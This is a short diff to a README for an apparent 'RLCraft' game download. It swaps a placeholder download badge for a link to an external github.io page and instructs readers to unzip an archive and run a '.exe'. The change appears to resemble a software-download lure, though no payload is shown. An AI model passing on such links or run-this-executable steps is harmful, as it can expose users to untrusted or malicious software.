@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://rlcraft-download.github.io/.github/)
 
 ## 📸 Overview
   <img width="1920" height="1080" alt="rlcraft-hardcore-survival" src="https://github.com/user-attachments/assets/68094d88-50f5-4482-a035-cf9e1b666f96" />
